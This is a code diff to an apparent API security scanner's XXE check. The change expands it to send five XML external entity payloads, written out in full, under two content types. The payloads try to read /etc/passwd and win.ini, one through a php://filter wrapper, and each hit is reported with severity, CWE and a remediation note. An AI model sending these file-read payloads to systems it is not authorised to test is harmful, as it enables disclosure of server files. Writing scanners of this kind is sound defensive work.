@@ -84,18 +84,31 @@ class ApiScanner:
 
     def _xxe(self, base: str, endpoint: str) -> list[Finding]:
         out: list[Finding] = []
-        r = self.http.post(f"{base}{endpoint}",
-                           headers={"Content-Type": "application/xml"}, content=XXE_PAYLOAD)
-        if det.traversal_ok(r.text):
-            self.log.action(base, self.name, f"XXE probe POST {endpoint}")
-            self._report(out, Finding(
-                title=f"XML External Entity (XXE) in POST {endpoint}",
-                severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-611",
-                target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
-                description="The XML parser expands external entities — reading a file (file:///etc/passwd).",
-                impact="Reading server files, SSRF, potentially DoS (billion laughs).",
-                recommendation="Disable external entity expansion and DTDs in the XML parser.",
-                evidence=Evidence(payload=XXE_PAYLOAD, response=r.text[:250])))
+        # several file-read XXE shapes: SYSTEM entity, php filter wrapper, UTF-16, parameter entity
+        payloads = [
+            XXE_PAYLOAD,
+            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
+            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
+             '"php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>'),
+            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">'
+             '<!ENTITY y SYSTEM "file:///c:/windows/win.ini">]><r>&x;&y;</r>'),
+            ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
+             '<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
+        ]
+        for i, pl in enumerate(payloads):
+            for ctype in ("application/xml", "text/xml"):
+                r = self.http.post(f"{base}{endpoint}", headers={"Content-Type": ctype}, content=pl)
+                if det.traversal_ok(r.text):
+                    self.log.action(base, self.name, f"XXE probe POST {endpoint} (variant {i})")
+                    self._report(out, Finding(
+                        title=f"XML External Entity (XXE) in POST {endpoint}",
+                        severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-611",
+                        target=f"{base}{endpoint}", component=endpoint, source_tool=self.name,
+                        description="The XML parser expands external entities — reading a file (file:///etc/passwd).",
+                        impact="Reading server files, SSRF, potentially DoS (billion laughs).",
+                        recommendation="Disable external entity expansion and DTDs in the XML parser.",
+                        evidence=Evidence(payload=pl, response=r.text[:250])))
+                    return out
         return out
 
     def _report(self, out: list[Finding], f: Finding) -> None:
